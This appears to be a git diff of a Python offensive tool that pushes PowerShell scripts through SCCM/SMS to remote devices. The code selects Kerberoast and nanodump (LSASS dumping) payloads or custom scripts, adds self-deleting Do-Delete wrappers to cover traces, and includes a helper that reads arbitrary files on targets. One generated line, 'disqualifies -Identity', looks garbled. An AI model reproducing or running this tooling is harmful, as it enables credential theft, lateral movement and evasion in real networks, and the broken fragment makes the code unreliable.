@@ -15,30 +15,21 @@ from datetime import datetime
 
 class SMSSCRIPTS:
 
-    def __init__(self, username, password, target, device, logs_dir, optional=None, optional_target=None):
+    def __init__(self, username, password, target, logs_dir):
         self.username = username
         self.password = password
         self.target = target
-        self.device = device
-        self.optional = optional
-        self.optional_t = optional_target
         self.logs_dir = logs_dir
         self.headers = {'Content-Type': 'application/json; odata=verbose'}
         self.cwd = os.getcwd()
         self.appended = ""
-        self.roast = False
         self.opid = ""
         self.guid = ""
 
-
-    def run(self):
-        if self.optional == "kerberoast":
-             self.script = self.cwd + "/lib/source/Kerberoast.ps1"
-        if self.optional == "nanodump":
-             self.script = self.cwd + "/lib/source/nanodump.ps1"
-        if self.optional == "custom":
-             self.script = self.optional_t
-
+    def run(self, device, optional_target=None):
+        if optional_target:
+             self.script = optional_target
+        self.device = device
         self.add_script()
 
     def read_script(self):
@@ -182,20 +173,9 @@ Do-Delete
                 logger.info(f"[+] Script with GUID {self.guid} deleted.")
         except Exception as e:
                 logger.info(e)
-            
 
-    def kerberoast(self):
-         self.appended = '''
-disqualifies -Identity %s
-function Do-Delete {
-    Del $MyInvocation.PSCommandPath
-}
-Do-Delete
-    ''' % self.optional_t
-         self.roast = True
-         self.run()
 
-    def cat(self, file):
+    def cat(self, file, device):
         script = '''
 function do-cat{
     $contents = (Get-Content -Path %s) -replace 111,222
@@ -211,6 +191,7 @@ Do-Delete
         byte_array = bom + script.encode('utf-16-le')
         script_body = base64.b64encode(byte_array).decode('utf-8')
         self.add_script(script_body)
+        self.device = device
 
 
     def printlog(self, result):
